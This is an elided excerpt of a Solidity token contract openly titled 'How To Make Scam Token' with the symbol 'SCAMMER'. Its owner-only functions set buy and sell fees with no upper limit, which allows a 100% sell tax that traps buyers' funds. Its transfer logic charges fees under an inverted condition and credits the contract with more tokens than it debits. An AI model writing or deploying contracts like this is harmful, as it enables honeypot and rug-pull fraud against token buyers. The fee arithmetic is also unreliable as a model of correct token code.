...
contract SCAMTOKEN is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0x5822Ff800D0b9AcEF0c5E041c8aDdB5A1d1b5aD7);
    ...
    string private constant _name = "How To Make Scam Token"; 
    string private constant _symbol = unicode"SCAMMER"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 

    uint256 public _totalFeeBuy = 1;
    uint256 public _totalFeeSell = 1;

    uint256 private  Percent_Marketing = 70;
    uint256 private  Percent_Dev = 25;
    uint256 private  Percent_Burn = 3;
    uint256 private  Percent_AutoLP = 2; 
    ...
    function UpdateTotalFeeBuy (uint256 NewFeeBuy) external  onlyOwner {
        _totalFeeBuy = NewFeeBuy;
    }

    function UpdateTotalFeeSell (uint256 NewFeeSell) external  onlyOwner {
        _totalFeeSell = NewFeeSell;
    }
    ...
    function claimStuckTokens(address token, uint256 value) external onlyOwner {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 buyFEE = tAmount*_totalFeeBuy/100;
            uint256 sellFEE = tAmount*_totalFeeSell/100;
            FeeAmount = tAmount-buyFEE;
            totalFeeAmount = sellFEE+buyFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+FeeAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+totalFeeAmount;   
            emit Transfer(sender, recipient, FeeAmount);

            if(recipient == Wallet_Burn)
            _tTotal = _tTotal-FeeAmount;
            
            } else {

            uint256 buyFEE = tAmount*_totalFeeBuy/100;
            uint256 sellFEE = tAmount*_totalFeeSell/100;
            FeeAmount = tAmount-sellFEE;
            totalFeeAmount = sellFEE+buyFEE;
